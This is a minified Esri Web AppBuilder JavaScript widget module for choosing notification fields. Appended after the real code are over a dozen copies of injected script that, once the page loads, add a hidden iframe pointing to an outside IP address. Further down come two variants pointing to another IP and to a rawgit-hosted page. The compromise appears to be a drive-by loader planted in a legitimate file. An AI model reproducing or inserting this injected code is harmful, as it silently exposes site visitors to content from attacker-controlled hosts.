// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/array dojo/_base/declare dojo/_base/lang dojo/dom-attr dojo/dom-class dojo/dom-construct dojo/dom-style dojo/on dojo/query jimu/dijit/CheckBox jimu/dijit/Popup ./settingComponents ./SettingObject".split(" "),function(e,n,k,p,g,q,l,r,h,t,u,f,v){return n(v,{_echoArea:null,_fieldMenuItems:[],_fieldsCheckBoxes:[],_fieldsPopup:null,_nls:null,_label:"",constructor:function(a,b,d,c,e,g,h,l){a=[];var m=[];this._nls=b;this._label=g;this._fieldMenuItems=l;this._echoArea=f.text("variable-width inline-block readOnlyTextField");
m.push(this._echoArea);b=f.iconButton("edit-button",b.tooltips.openFieldSelector);this.own(r(b,"click",k.hitch(this,this._onFieldsSelectorClick)));m.push(b);a.push(f.container("full-width flexbox","minorTrailingHorizGap",m));h&&a.push(f.text("hint",h));this._mainDiv=f.container("flexbox "+(d||""),"minorTrailingHorizGap",[f.container("inline-block "+(c?c:""),"",[f.text("static-text",g)]),f.container("inline-block "+(e?e:""),"minorTrailingVertGap",a)])},setDisplay:function(a){this._echoArea&&(this._echoArea.innerHTML=
Array.isArray(a)&&0<a.length?a.join(","):"")},setConfig:function(){var a=[];Array.isArray(this._config)&&0<this._config.length&&e.forEach(this._config,k.hitch(this,function(b){e.some(this._fieldMenuItems,function(d){return b===d.value?(a.push(d.label),!0):!1})}));this.setDisplay(a)},setFieldList:function(a){this._fieldMenuItems=a},_onFieldsSelectorClick:function(){var a=q.create("div",{style:{maxHeight:"480px"}});this._fieldsCheckBoxes=[];e.forEach(this._fieldMenuItems,k.hitch(this,function(b,d){var c=
new t({checked:this._arrayContains(this._config,b.value),label:b.label});g.add(c.domNode,"fields-checkbox");g.add(c.labelNode,"jimu-ellipsis");p.set(c.domNode,"title",b.label);0===d%3&&(window.isRTL?l.set(c.domNode,"marginRight",0):l.set(c.domNode,"marginLeft",0));c.placeAt(a);h(c.domNode).data("fieldName",b.value);this._fieldsCheckBoxes.push(c)}));this._fieldsPopup=new u({titleLabel:this._label,autoHeight:!0,content:a,container:window.jimuConfig.layoutId,width:640,maxHeight:600,buttons:[{label:jimuNls.common.ok,
onClick:k.hitch(this,"_onSearchFieldsOk")},{label:jimuNls.common.cancel,classNames:["jimu-btn-vacation"]}],onClose:k.hitch(this,function(){this._fieldsPopup=null})});g.add(this._fieldsPopup.domNode,"jimu-widget-public-notification-setting-fields")},_arrayContains:function(a,b){return e.some(a,function(a){return a===b})},_onSearchFieldsOk:function(){var a=[],b=[];e.forEach(this._fieldsCheckBoxes,function(d){if(d.getValue()){var c=h(d.domNode).data("fieldName");a.push(c[0]);h(d.domNode).removeData();
b.push(d.label)}});this._config=a;this.setDisplay(b);this._fieldsPopup.close()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});